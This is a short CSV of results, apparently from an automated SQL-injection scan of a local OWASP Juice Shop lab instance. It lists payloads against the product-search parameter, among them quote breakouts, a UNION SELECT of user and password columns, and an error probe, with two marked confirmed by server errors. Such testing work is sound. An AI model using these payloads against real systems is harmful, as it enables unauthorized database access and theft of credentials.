target,url,param,vuln_type,technique,payload,confirmed,evidence
juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,basic_quote_breakout,1' OR '1'='1,False,no_anomaly_detected
juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,quote_free_bypass,1 OR 1=1,False,no_anomaly_detected
juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,union_data_exfiltration,"1' UNION SELECT user, password FROM users #",True,sql_error_or_5xx_status (status=500)
juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,logical_control_check,1' AND '1'='2,False,no_anomaly_detected
juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,error_trigger_probe,'(,True,sql_error_or_5xx_status (status=500)
